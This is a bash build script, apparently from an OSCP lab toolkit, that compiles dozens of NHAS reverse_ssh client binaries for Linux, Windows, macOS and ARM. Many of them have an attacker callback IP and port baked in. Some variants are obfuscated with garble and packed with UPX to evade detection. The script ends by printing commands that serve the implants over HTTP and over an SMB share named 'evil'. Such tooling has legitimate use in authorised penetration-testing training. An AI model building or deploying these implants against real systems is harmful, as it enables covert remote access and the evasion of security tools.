#!/bin/bash
#
# NHAS Agent Builder - Build all binary variants
# Output: /home/alien/Desktop/Tools/OSCP-nhas-ssh-server/bin/exploits/
#

NHAS_DIR="${NHAS_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)}"
OUTPUT_DIR="$NHAS_DIR/bin/exploits"
DEFAULT_PORT="3232"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m'
BOLD='\033[1m'

# Get default IP for prompt
_DEFAULT_IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[[ -z "$_DEFAULT_IP" ]] && _DEFAULT_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
[[ -z "$_DEFAULT_IP" ]] && _DEFAULT_IP="10.10.14.1"

echo -e "${CYAN}"
cat << 'EOF'
    _   ____  _____   _____   ____        _ __    __
   / | / / / / /   | / ___/  / __ )__  __(_) /___/ /
  /  |/ / /_/ / /| | \__ \  / __  / / / / / / __  / 
 / /|  / __  / ___ |___/ / / /_/ / /_/ / / / /_/ /  
/_/ |_/_/ /_/_/  |_/____/ /_____/\__,_/_/_/\__,_/   
EOF
echo -e "${NC}"

# Ask for interface or IP
echo ""
read -p "Interface or IP [tun0]: " INPUT_IFACE
if [[ "${INPUT_IFACE:-tun0}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    TUN0_IP="${INPUT_IFACE:-$_DEFAULT_IP}"
else
    _IFACE="${INPUT_IFACE:-tun0}"
    TUN0_IP=$(ip -4 addr show "$_IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [[ -z "$TUN0_IP" ]] && TUN0_IP="$_DEFAULT_IP" && echo -e "${YELLOW}[!] Interface not found, using: ${TUN0_IP}${NC}"
fi

read -p "Callback IP [${TUN0_IP}]: " INPUT_IP
CALLBACK_IP="${INPUT_IP:-$TUN0_IP}"

read -p "Callback Port [${DEFAULT_PORT}]: " INPUT_PORT
CALLBACK_PORT="${INPUT_PORT:-$DEFAULT_PORT}"

CALLBACK="${CALLBACK_IP}:${CALLBACK_PORT}"

echo ""
echo -e "${GREEN}[+]${NC} Callback address: ${CALLBACK}"
echo -e "${GREEN}[+]${NC} Output directory: ${OUTPUT_DIR}"
echo ""

# Check NHAS source
if [[ ! -f "$NHAS_DIR/go.mod" ]]; then
    echo -e "${RED}[!] NHAS source not found at $NHAS_DIR${NC}"
    exit 1
fi

cd "$NHAS_DIR" || exit 1
mkdir -p "$OUTPUT_DIR"

# ─── Server host key → RSSH_FINGERPRINT ─────────────────────────────────────
# reverse_ssh server loads bin/id_ed25519 as its host key and prints the
# fingerprint as a raw 64-char hex SHA256.  Clients must have the matching hex
# fingerprint compiled in via RSSH_FINGERPRINT, otherwise they reject the server.
# setup-nhas.sh pre-generates this key so it exists before any build is attempted.
SERVER_KEY="$NHAS_DIR/bin/id_ed25519"
if [[ -f "$SERVER_KEY" ]]; then
    # ssh-keygen gives SHA256:base64 — convert to raw hex to match what the server expects
    _FP_B64=$(ssh-keygen -lf "$SERVER_KEY" -E sha256 2>/dev/null | awk '{print $2}' | sed 's/SHA256://')
    RSSH_FINGERPRINT=$(printf '%s==' "$_FP_B64" | base64 -d 2>/dev/null | xxd -p | tr -d '\n')
    if [[ -n "$RSSH_FINGERPRINT" ]]; then
        export RSSH_FINGERPRINT
        echo -e "${GREEN}[+]${NC} Server fingerprint: ${CYAN}${RSSH_FINGERPRINT}${NC}"
        echo -e "${GRAY}    Baked into every client — server identity verified on connect${NC}"
    else
        echo -e "${RED}[!]${NC} Could not convert fingerprint from $SERVER_KEY"
        echo -e "${RED}[!]${NC} Ensure ssh-keygen and xxd are installed, then rerun${NC}"
    fi
else
    echo -e "${RED}[!]${NC} Server key not found: $SERVER_KEY"
    echo -e "${RED}[!]${NC} Clients will REJECT the server — run setup-nhas.sh first${NC}"
    echo -e "${GRAY}    Fix: sudo bash $NHAS_DIR/setup-nhas.sh${NC}"
    echo ""
    read -p "Continue building without fingerprint? (clients won't connect) [y/N]: " _CONT
    [[ "${_CONT,,}" != "y" ]] && exit 1
fi
echo ""

# Check for garble
HAS_GARBLE=0
if command -v garble &> /dev/null; then
    HAS_GARBLE=1
    echo -e "${GREEN}[+]${NC} Garble found - will build obfuscated binaries"
else
    echo -e "${YELLOW}[!]${NC} Garble not found - skipping obfuscated builds"
    echo -e "${GRAY}    Install: go install mvdan.cc/garble@latest${NC}"
fi

# Check for UPX
HAS_UPX=0
if command -v upx &> /dev/null; then
    HAS_UPX=1
    echo -e "${GREEN}[+]${NC} UPX found - will compress binaries"
else
    echo -e "${YELLOW}[!]${NC} UPX not found - skipping compression"
    echo -e "${GRAY}    Install: apt install upx  |  pacman -S upx  |  dnf install upx${NC}"
fi

echo ""
echo -e "${BOLD}=============================================="
echo -e "  BUILDING BINARIES..."
echo -e "==============================================${NC}"
echo ""

# Build function
build() {
    local name=$1
    local goos=$2
    local goarch=$3
    local goarm=$4
    local homeserver=$5
    local obfuscate=$6
    local compress=$7
    
    local output="$OUTPUT_DIR/$name"
    
    export GOOS=$goos
    export GOARCH=$goarch
    export CGO_ENABLED=0
    
    if [[ -n "$goarm" ]]; then
        export GOARM=$goarm
    else
        unset GOARM
    fi
    
    if [[ -n "$homeserver" ]]; then
        export RSSH_HOMESERVER=$homeserver
    else
        unset RSSH_HOMESERVER
    fi
    
    printf "  %-45s" "$name"
    
    if [[ "$obfuscate" == "1" && $HAS_GARBLE -eq 1 ]]; then
        garble -tiny -literals -seed=random build -trimpath -ldflags="-s -w" -o "$output" ./cmd/client 2>/dev/null
    else
        go build -trimpath -ldflags="-s -w" -o "$output" ./cmd/client 2>/dev/null
    fi
    
    if [[ -f "$output" ]]; then
        if [[ "$compress" == "1" && $HAS_UPX -eq 1 ]]; then
            upx -q -q "$output" 2>/dev/null
        fi
        local size=$(du -h "$output" | cut -f1)
        echo -e "${GREEN}✓${NC} ($size)"
    else
        echo -e "${RED}✗${NC}"
    fi
}

echo -e "${CYAN}--- Linux x64 (MOST USED) ---${NC}"
build "nhasLinuxAmd64Direct"              linux amd64 "" "$CALLBACK" 0 0
build "nhasLinuxAmd64DirectCompressed"    linux amd64 "" "$CALLBACK" 0 1
build "nhasLinuxAmd64"                    linux amd64 "" ""          0 0
build "nhasLinuxAmd64Compressed"          linux amd64 "" ""          0 1
echo ""

echo -e "${CYAN}--- Windows x64 ---${NC}"
build "nhasWinAmd64Direct.exe"            windows amd64 "" "$CALLBACK" 0 0
build "nhasWinAmd64DirectCompressed.exe"  windows amd64 "" "$CALLBACK" 0 1
build "nhasWinAmd64.exe"                  windows amd64 "" ""          0 0
build "nhasWinAmd64Compressed.exe"        windows amd64 "" ""          0 1
echo ""

echo -e "${CYAN}--- Windows x86 (32-bit) ---${NC}"
build "nhasWin386Direct.exe"              windows 386 "" "$CALLBACK" 0 0
build "nhasWin386.exe"                    windows 386 "" ""          0 0
echo ""

echo -e "${CYAN}--- Linux x86 (32-bit) ---${NC}"
build "nhasLinux386Direct"                linux 386 "" "$CALLBACK" 0 0
build "nhasLinux386"                      linux 386 "" ""          0 0
echo ""

echo -e "${CYAN}--- Linux ARM64 ---${NC}"
build "nhasLinuxArm64Direct"              linux arm64 "" "$CALLBACK" 0 0
build "nhasLinuxArm64"                    linux arm64 "" ""          0 0
echo ""

echo -e "${CYAN}--- Linux ARMv7 ---${NC}"
build "nhasLinuxArmv7Direct"              linux arm "7" "$CALLBACK" 0 0
build "nhasLinuxArmv7"                    linux arm "7" ""          0 0
echo ""

echo -e "${CYAN}--- Linux ARMv6 ---${NC}"
build "nhasLinuxArmv6Direct"              linux arm "6" "$CALLBACK" 0 0
build "nhasLinuxArmv6"                    linux arm "6" ""          0 0
echo ""

echo -e "${CYAN}--- macOS ---${NC}"
build "nhasMacAmd64Direct"                darwin amd64 "" "$CALLBACK" 0 0
build "nhasMacAmd64"                      darwin amd64 "" ""          0 0
build "nhasMacArm64Direct"                darwin arm64 "" "$CALLBACK" 0 0
build "nhasMacArm64"                      darwin arm64 "" ""          0 0
echo ""

if [[ $HAS_GARBLE -eq 1 ]]; then
    echo -e "${CYAN}--- Obfuscated (Garble) ---${NC}"
    build "nhasLinuxAmd64ObfDirect"           linux amd64 "" "$CALLBACK" 1 0
    build "nhasLinuxAmd64ObfDirectCompressed" linux amd64 "" "$CALLBACK" 1 1
    build "nhasLinuxAmd64Obf"                 linux amd64 "" ""          1 0
    build "nhasWinAmd64ObfDirect.exe"         windows amd64 "" "$CALLBACK" 1 0
    build "nhasWinAmd64ObfDirectCompressed.exe" windows amd64 "" "$CALLBACK" 1 1
    build "nhasWinAmd64Obf.exe"               windows amd64 "" ""          1 0
    echo ""
fi

echo -e "${BOLD}=============================================="
echo -e "  RESULTS"
echo -e "==============================================${NC}"
echo ""
ls -lhS "$OUTPUT_DIR"/ 2>/dev/null | grep nhas | head -30
echo ""

TOTAL=$(ls -1 "$OUTPUT_DIR"/nhas* 2>/dev/null | wc -l)
echo -e "${GREEN}[+]${NC} Built ${TOTAL} binaries"
echo -e "${GREEN}[+]${NC} Direct binaries have ${CALLBACK} baked in"
echo -e "${GREEN}[+]${NC} Non-direct binaries need: ./binary -d ${CALLBACK}"
echo ""

echo -e "${BOLD}=============================================="
echo -e "  SERVE FILES"
echo -e "==============================================${NC}"
echo ""
echo -e "  ${YELLOW}python3 -m http.server 80 -d ${OUTPUT_DIR}${NC}"
echo -e "  ${YELLOW}impacket-smbserver evil ${OUTPUT_DIR} -smb2support${NC}"
echo ""

echo -e "${BOLD}=============================================="
echo -e "  MANUAL BUILD COMMANDS"
echo -e "=============================================="
echo -e "  Run from: cd ${NHAS_DIR}"
echo -e "==============================================${NC}"
echo ""

echo -e "${CYAN}# ========== DIRECT (callback baked in) ==========${NC}"
echo ""
echo -e "${GRAY}# Linux x64 Direct (MOST USED)${NC}"
echo "GOOS=linux GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64Direct ./cmd/client"
echo ""
echo -e "${GRAY}# Linux x64 Direct + UPX${NC}"
echo "GOOS=linux GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64DirectCompressed ./cmd/client && upx --best bin/exploits/nhasLinuxAmd64DirectCompressed"
echo ""
echo -e "${GRAY}# Windows x64 Direct${NC}"
echo "GOOS=windows GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64Direct.exe ./cmd/client"
echo ""
echo -e "${GRAY}# Windows x64 Direct + UPX${NC}"
echo "GOOS=windows GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64DirectCompressed.exe ./cmd/client && upx --best bin/exploits/nhasWinAmd64DirectCompressed.exe"
echo ""
echo -e "${GRAY}# Windows x86 Direct${NC}"
echo "GOOS=windows GOARCH=386 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWin386Direct.exe ./cmd/client"
echo ""
echo -e "${GRAY}# Linux x86 Direct${NC}"
echo "GOOS=linux GOARCH=386 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinux386Direct ./cmd/client"
echo ""

echo -e "${CYAN}# ========== NON-DIRECT (needs -d flag) ==========${NC}"
echo ""
echo -e "${GRAY}# Linux x64${NC}"
echo "GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64 ./cmd/client"
echo ""
echo -e "${GRAY}# Linux x64 + UPX${NC}"
echo "GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64Compressed ./cmd/client && upx --best bin/exploits/nhasLinuxAmd64Compressed"
echo ""
echo -e "${GRAY}# Windows x64${NC}"
echo "GOOS=windows GOARCH=amd64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64.exe ./cmd/client"
echo ""
echo -e "${GRAY}# Windows x86${NC}"
echo "GOOS=windows GOARCH=386 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWin386.exe ./cmd/client"
echo ""
echo -e "${GRAY}# Linux x86${NC}"
echo "GOOS=linux GOARCH=386 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinux386 ./cmd/client"
echo ""

echo -e "${CYAN}# ========== ARM (Direct) ==========${NC}"
echo ""
echo -e "${GRAY}# Linux ARM64 Direct${NC}"
echo "GOOS=linux GOARCH=arm64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArm64Direct ./cmd/client"
echo ""
echo -e "${GRAY}# Linux ARMv7 Direct${NC}"
echo "GOOS=linux GOARCH=arm GOARM=7 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArmv7Direct ./cmd/client"
echo ""
echo -e "${GRAY}# Linux ARMv6 Direct${NC}"
echo "GOOS=linux GOARCH=arm GOARM=6 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArmv6Direct ./cmd/client"
echo ""

echo -e "${CYAN}# ========== ARM (Non-Direct) ==========${NC}"
echo ""
echo -e "${GRAY}# Linux ARM64${NC}"
echo "GOOS=linux GOARCH=arm64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArm64 ./cmd/client"
echo ""
echo -e "${GRAY}# Linux ARMv7${NC}"
echo "GOOS=linux GOARCH=arm GOARM=7 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArmv7 ./cmd/client"
echo ""
echo -e "${GRAY}# Linux ARMv6${NC}"
echo "GOOS=linux GOARCH=arm GOARM=6 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxArmv6 ./cmd/client"
echo ""

echo -e "${CYAN}# ========== macOS ==========${NC}"
echo ""
echo -e "${GRAY}# macOS x64 Direct${NC}"
echo "GOOS=darwin GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasMacAmd64Direct ./cmd/client"
echo ""
echo -e "${GRAY}# macOS ARM64 Direct (M1/M2)${NC}"
echo "GOOS=darwin GOARCH=arm64 RSSH_HOMESERVER=${CALLBACK} go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasMacArm64Direct ./cmd/client"
echo ""
echo -e "${GRAY}# macOS x64${NC}"
echo "GOOS=darwin GOARCH=amd64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasMacAmd64 ./cmd/client"
echo ""
echo -e "${GRAY}# macOS ARM64${NC}"
echo "GOOS=darwin GOARCH=arm64 go build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasMacArm64 ./cmd/client"
echo ""

echo -e "${CYAN}# ========== OBFUSCATED (requires garble) ==========${NC}"
echo -e "${GRAY}# Install: go install mvdan.cc/garble@latest${NC}"
echo ""
echo -e "${GRAY}# Linux x64 Obfuscated Direct${NC}"
echo "GOOS=linux GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64ObfDirect ./cmd/client"
echo ""
echo -e "${GRAY}# Linux x64 Obfuscated Direct + UPX${NC}"
echo "GOOS=linux GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64ObfDirectCompressed ./cmd/client && upx --best bin/exploits/nhasLinuxAmd64ObfDirectCompressed"
echo ""
echo -e "${GRAY}# Windows x64 Obfuscated Direct${NC}"
echo "GOOS=windows GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64ObfDirect.exe ./cmd/client"
echo ""
echo -e "${GRAY}# Windows x64 Obfuscated Direct + UPX${NC}"
echo "GOOS=windows GOARCH=amd64 RSSH_HOMESERVER=${CALLBACK} garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64ObfDirectCompressed.exe ./cmd/client && upx --best bin/exploits/nhasWinAmd64ObfDirectCompressed.exe"
echo ""
echo -e "${GRAY}# Linux x64 Obfuscated (non-direct)${NC}"
echo "GOOS=linux GOARCH=amd64 garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasLinuxAmd64Obf ./cmd/client"
echo ""
echo -e "${GRAY}# Windows x64 Obfuscated (non-direct)${NC}"
echo "GOOS=windows GOARCH=amd64 garble -tiny -literals -seed=random build -trimpath -ldflags=\"-s -w\" -o bin/exploits/nhasWinAmd64Obf.exe ./cmd/client"
echo ""